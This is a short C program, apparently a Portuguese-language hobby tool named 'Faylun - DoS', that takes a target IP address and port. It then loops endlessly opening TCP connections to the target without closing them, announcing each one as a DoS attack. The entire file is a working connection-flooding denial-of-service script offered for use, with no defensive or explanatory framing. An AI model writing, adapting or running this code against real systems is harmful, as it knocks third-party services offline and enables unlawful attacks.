#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <unistd.h>

#define GREEN   "\x1b[32m"
#define RED     "\x1b[31m"
#define RESET   "\x1b[0m"
#define BOLD    "\x1b[1m"

int main(int argc, char *argv[]){
	int meuSocket;
	int conecta;
	char *destino;
	int porta;
	struct sockaddr_in alvo;

	if (argc != 3){
                printf(BOLD GREEN "-*-*-*-*-*-*-*-*-*-*-*-*- Faylun - DoS -*-*-*-*-*-*-*-*-*-*-*-*-\n\n" RESET);
                printf(BOLD "   Uso:" RESET " %s <ALVO> <PORTA>\n", argv[0]);
                printf(BOLD "   Exemplo:" RESET "  %s 10.10.10.10 21\n", argv[0]);
                printf(BOLD GREEN "\n-*-*-*-*-*-*-*-*-*-*-*-*--*-*-*-*-*-*-*-*-*-*-*-*--*-*-*-*-*-*-*-*-*-\n" RESET);
	} else {
		printf("Iniciando ataque DoS...\n");
		printf("-----------------------------------------------\n\n");

		while(1){
			destino = argv[1];
			porta = atoi(argv[2]);
			meuSocket = socket(AF_INET, SOCK_STREAM, 0);

			alvo.sin_family = AF_INET;
			alvo.sin_port = htons(porta);
			alvo.sin_addr.s_addr = inet_addr(destino);

			conecta = connect(meuSocket, (struct sockaddr *)&alvo, sizeof alvo);

			if (conecta == 0){
				printf("Realizando ataque DoS em " BOLD "%s " RESET "na porta " BOLD "%d" RESET "\n", destino, porta);
				sleep(1);
			}
		}
	}
}
